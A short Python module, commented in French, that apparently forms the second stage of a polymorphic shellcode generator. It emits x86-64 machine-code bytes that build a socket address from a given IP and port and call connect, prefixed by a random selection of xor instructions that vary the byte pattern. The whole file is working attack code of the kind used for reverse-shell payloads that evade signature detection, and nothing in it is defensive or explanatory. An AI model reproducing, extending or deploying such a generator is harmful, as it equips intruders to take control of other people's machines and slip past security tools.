#!/usr/bin/env python3
import random
from func_instu import *

def partie2(port, ip):

    subrsp = '\\x48\\x83\\xec\\x08' # sub rsp, 8
    movb = '\\xc6\\x04\\x24\\x02' # mov BYTE[rsp],0x2
    movw1 = f'\\x66\\xc7\\x44\\x24\\x02\\{port}' # mov WORD[rsp+0x2], {PORT HEXA Little IDIAN}
    movw2 = f'\\xc7\\x44\\x24\\x04\\{ip}'
    movrsi = '\\x48\\x89\\xe6' # mov rsi, rsp
    movdl = '\\xb2\\x10' # mov dl, 16
    pushr8 = '\\x41\\x50' # push r8
    poprdi = '\\x5f' # pop rdi
    moval = '\\xb0\\x2a' # mov al, 42
    syscall = '\\x0f\\x05' # syscall

    part2 = [
            '\\x48\\x31\\xdb', # xor rbx, rbx
            '\\x48\\x31\\xc9', # xor rcx, rcx
            '\\x48\\x31\\xd2', # xor rdx, rdx
            '\\x48\\x31\\xff', # xor rdi, rdi
            '\\x48\\x31\\xf6'  # xor rsi, rsi
    ]

       # choix d'un chiffre aléatoire entre 0 et 5
    x = random.randint(0, 5)

    print('part2 = ',x)

    resultat = []  # Initialise une liste vide pour stocker les instructions

    if x > 0:
        choix = random.sample(range(len(part2)), min(x, len(part2)))
        for index in choix:
            resultat.append(part2[index])

    # Concaténation de toutes les variables
    resultat_concat = ''.join(resultat) + subrsp + movb + movw1 + movw2 + movrsi + movdl + pushr8 + poprdi + moval + syscall

    print(resultat_concat)
    print("")
    
    return resultat_concat  